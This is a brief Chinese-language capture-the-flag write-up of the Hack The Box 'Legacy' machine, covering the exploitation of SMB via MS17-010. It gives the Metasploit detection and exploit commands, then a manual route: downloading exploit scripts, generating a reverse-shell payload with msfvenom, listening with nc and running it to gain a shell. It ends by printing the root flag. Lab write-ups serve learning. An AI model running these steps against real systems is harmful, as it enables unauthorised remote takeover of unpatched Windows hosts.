# Legacy

> victim: 10.10.10.4
>
> local: 10.10.14.19

## 扫描结果分析

### Light Scan

只有139和445

尝试一下ms17-010和ms08-067

## smb尝试

### ms17-010(msf)

#### 检测

```bash
msfconsole

use auxiliary/scanner/smb/smb_ms17_010
set rhost 10.10.10.4
run
```

检测可行

#### 攻击

```bash
use exploit/windows/smb/ms17_010_psexec
set rhost 10.10.10.4
set lhost 10.10.14.19
run
```

没法成功，可能是因为windows XP的原因，换手动或者08067吧

### ms17-010(manual)

```bash
proxychains4 wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
proxychains4 wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py -O mysmb.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=4445 -f exe >a.exe
nc -lvvp 4445

python send_and_execute.py 10.10.10.4 a.exe
```

成功拿到shell

```bash
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

```
993442d258b0e0ec917cae9e695d5713
```

